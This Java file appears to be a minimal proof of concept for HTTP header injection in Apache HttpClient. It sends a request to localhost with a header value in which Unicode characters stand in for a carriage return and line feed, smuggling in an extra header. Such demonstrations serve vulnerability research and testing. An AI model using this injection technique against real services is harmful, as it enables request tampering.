package org.dynatrace.ssrfservice;

import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;


class Main {
    public final static void main(String[] args) throws Exception {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        String attackerControlledValue = "1\u560d\u560aX-But-Not-This-One: oh no!";
        try {
            HttpGet httpget = new HttpGet("http://127.0.0.1:1234/");
            httpget.addHeader("X-I-Expect-This-Header", attackerControlledValue);
            httpclient.execute(httpget);
        } finally {
            httpclient.close();
        }
    }
}
